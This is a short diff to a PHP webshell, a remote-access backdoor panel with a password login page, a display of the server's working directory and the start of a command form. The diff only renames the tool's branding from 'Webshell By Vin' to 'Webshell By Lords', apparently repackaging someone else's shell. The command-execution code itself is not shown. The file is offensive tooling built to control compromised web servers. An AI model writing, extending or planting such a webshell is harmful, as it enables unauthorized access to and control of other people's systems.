@@ -11,12 +11,12 @@ if (!isset($_SESSION['auth'])) {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Webshell By Vin</title>
+        <title>Webshell By Lords</title>
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     </head>
     <body class="bg-dark d-flex justify-content-center align-items-center vh-100 text-light">
         <form method="post" class="bg-secondary p-4 rounded shadow">
-            <h3 class="mb-3">Login Webshell By Vin</h3>
+            <h3 class="mb-3">Login Webshell By Lords</h3>
             <input type="password" name="pass" class="form-control mb-3" placeholder="Password">
             <button class="btn btn-light w-100">Login</button>
         </form>
@@ -51,12 +51,12 @@ function encode($s) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Webshell By Vin</title>
+    <title>Webshell By Lords</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
 </head>
 <body class="bg-dark text-light">
 <div class="container py-4">
-    <h4 class="mb-4">Webshell By Vin @ <?php echo encode(getcwd()); ?></h4>
+    <h4 class="mb-4">Webshell By Lords @ <?php echo encode(getcwd()); ?></h4>
 
     <!-- Command -->
     <form method="post" class="mb-3">
